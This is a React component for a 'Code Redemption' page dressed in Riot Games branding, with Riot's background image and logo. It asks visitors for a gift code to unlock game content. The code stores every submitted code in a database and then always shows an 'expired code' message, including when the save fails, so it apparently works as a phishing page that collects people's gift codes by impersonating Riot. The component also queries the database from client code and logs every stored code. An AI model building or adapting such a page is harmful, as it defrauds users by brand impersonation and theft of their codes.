import React, { useEffect, useState } from 'react';
import  {prisma}  from '../lib/prisma';

interface CodeRedemptionProps {
  onSubmit: (code: string) => void;
}



const CodeRedemption: React.FC<CodeRedemptionProps> = ({ onSubmit }) => {
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    if (value === '' || (/^\d*$/.test(value) && value.length <= 10)) {
      setCode(value);
      setError('');
    } else {
      setError('Code must contain only numbers and be at most 10 digits');
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    console.log('handleSubmit called');
    e.preventDefault();
    if (code.length === 0) {
      setError('Please enter a code');
      return;
    }

    setIsSubmitting(true);
    try {
      console.log("DANI AFEITATE")
      await prisma.redeemedCode.create({
        data: {
          code: code,
        },
      });
      console.log("DANI AFEITATE2")
      // Always show the expired code modal
      onSubmit(code);
      setCode('');
    } catch (err) {
     
      onSubmit(code); // Show modal for duplicate code
      setCode('');
    } finally {
      setIsSubmitting(false);
    }
  };
  useEffect(() => {
    const fetchCodes = async () => {
      const codes = await prisma.redeemedCode.findMany()
      console.log(codes)
    }
    fetchCodes()
  }, [])  
  return (
    <div className="relative min-h-screen flex items-center justify-center bg-[#0a1428]">
      <div className="absolute inset-0 bg-[url('https://images.contentstack.io/v3/assets/blt731acb42bb3d1659/blt11ab79d777f9af0e/5f4a433f9c83445463d03d6a/riot-games-background.jpg')] bg-cover bg-center"></div>
      <div className="absolute inset-0 bg-gradient-to-t from-white via-transparent to-white/80"></div>

      <div className="relative z-10 w-full max-w-xl px-6">
        <div className="text-center mb-12">
          <img className='mx-auto my-0' src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAiIGhlaWdodD0iODAiIHZpZXdCb3g9IjAgMCA4MCA4MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTAgNDBDMCAxNy45MDg2IDE3LjkwODYgMCA0MCAwQzYyLjA5MTQgMCA4MCAxNy45MDg2IDgwIDQwQzgwIDYyLjA5MTQgNjIuMDkxNCA4MCA0MCA4MEMxNy45MDg2IDgwIDAgNjIuMDkxNCAwIDQwWiIgZmlsbD0iI0Q1MzIzNSIvPgo8cGF0aCBkPSJNNDEuNDEyNCAyMEwxNy4yNSAzMS4xODk1TDIzLjI3MDQgNTQuMTAxOUwyNy44NTI0IDUzLjUzOTJMMjYuNTkyNSAzOS4xMzI4TDI4LjA5NyAzOC40NjI1TDMwLjY5NSA1My4xODk0TDM4LjUyNTggNTIuMjI4TDM3LjEzMzggMzYuMzI2OEwzOC42MjM2IDM1LjY2MzlMNDEuNDgwOSA1MS44NjU5TDQ5LjQwMjIgNTAuODkyM0w0Ny44NzgxIDMzLjQ2MjJMNDkuMzg1IDMyLjc5MTlMNTIuNTA5IDUwLjUxMDdMNjAuMzM5NyA0OS41NDkzVjI0Ljc0MUw0MS40MTI0IDIwWiIgZmlsbD0iI0ZDRkNGQyIvPgo8cGF0aCBkPSJNNDEuOTggNTQuNzUwMkw0Mi4zNzg3IDU3LjAwNTdMNjAuMzM5NyA2MFY1Mi40OTQ3TDQxLjk4OTggNTQuNzQ3N0w0MS45OCA1NC43NTAyWiIgZmlsbD0iI0ZDRkNGQyIvPgo8L3N2Zz4K" alt="" />
          <h1 className="text-4xl font-bold text-[#f9f9f9] mb-2">Code Redemption</h1>
          <p className="text-[#7e7e7e]">Enter your code to unlock exclusive content in any game of riot</p>
        </div>

        <form onSubmit={handleSubmit} className="bg-[#FFFFFF]/90 backdrop-blur-sm p-8 rounded-lg border border-[#2e2e2e]">
          <div className="space-y-4">
            <input
              type="text"
              value={code}
              onChange={handleChange}
              placeholder="ENTER YOUR GIFT CODE"
              className="w-full bg-[#111111] border border-[#2e2e2e] text-[#f9f9f9] px-4 py-3 rounded text-center text-lg placeholder-[#7e7e7e] focus:outline-none focus:border-[#f50505] transition-colors duration-200"
              disabled={isSubmitting}
            />
            {error && (
              <p className="text-[#d13639] text-sm">{error}</p>
            )}
            <button
              type="submit"
              className="w-full bg-[#FF0000] hover:bg-[#808080] text-[#FFFFFF] py-3 rounded font-semibold transition-colors duration-50 disabled:opacity-50 disabled:cursor-not-allowed"
              disabled={isSubmitting}
            >
              {isSubmitting ? 'PROCESSING...' : 'REDEEM'}
            </button>
          </div>
        </form>

        <div className="mt-8 flex justify-center space-x-6 text-sm text-[#7e7e7e]">
          <a href="#" className="text-[#555555] hover:text-black px-3 py-2 text-sm font-medium transition-colors duration-200">SUPPORT</a>
          <a href="#" className="text-[#555555] hover:text-black px-3 py-2 text-sm font-medium transition-colors duration-200">PRIVACY POLICY</a>
          <a href="#" className="text-[#555555] hover:text-black px-3 py-2 text-sm font-medium transition-colors duration-200">TERMS OF SERVICE</a>
        </div>
      </div>
    </div>
  );
};

export default CodeRedemption;
